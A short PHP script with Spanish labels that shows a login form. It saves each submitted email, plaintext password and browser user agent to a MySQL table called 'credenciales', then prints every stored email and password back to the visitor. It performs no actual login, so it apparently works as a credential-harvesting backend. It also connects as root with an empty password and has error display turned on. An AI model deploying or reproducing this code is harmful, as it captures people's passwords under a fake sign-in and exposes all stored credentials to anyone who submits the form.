<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $correo = $_POST['correo'] ?? '';
    $password = $_POST['password'] ?? '';
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $conn = new mysqli("localhost", "root", "", "melissa");
    if ($conn->connect_error) {
        die("Error DB: " . $conn->connect_error);
    }

    $stmt = $conn->prepare("INSERT INTO credenciales (correo, password, useragent) VALUES (?, ?, ?)");
    if (!$stmt) {
        die("Error al preparar la consulta: " . $conn->error);
    }

    $stmt->bind_param("sss", $correo, $password, $userAgent);

    if (!$stmt->execute()) {
        die("Error en la consulta: " . $stmt->error);
    }

    $stmt->close();

    echo "<h3>Datos guardados correctamente.</h3>";

    // Ahora mostramos todos los datos
    $result = $conn->query("SELECT id, correo, password, useragent, created_at FROM credenciales");

    if ($result->num_rows > 0) {
        echo "<h4>Datos en la tabla credenciales:</h4>";
        echo "<table border='1' cellpadding='5' cellspacing='0'>";
        echo "<tr><th>ID</th><th>Correo</th><th>Contraseña</th><th>User Agent</th><th>Fecha</th></tr>";
        while ($row = $result->fetch_assoc()) {
            echo "<tr>";
            echo "<td>" . htmlspecialchars($row['id']) . "</td>";
            echo "<td>" . htmlspecialchars($row['correo']) . "</td>";
            echo "<td>" . htmlspecialchars($row['password']) . "</td>";
            echo "<td>" . htmlspecialchars($row['useragent']) . "</td>";
            echo "<td>" . htmlspecialchars($row['created_at']) . "</td>";
            echo "</tr>";
        }
        echo "</table>";
    } else {
        echo "No hay datos para mostrar.";
    }

    $conn->close();

} else {
?>
<form method="POST">
    <label>Correo:</label><br>
    <input type="text" name="correo"><br>
    <label>Contraseña:</label><br>
    <input type="password" name="password"><br>
    <input type="submit" value="Iniciar sesión">
</form>
<?php } ?>
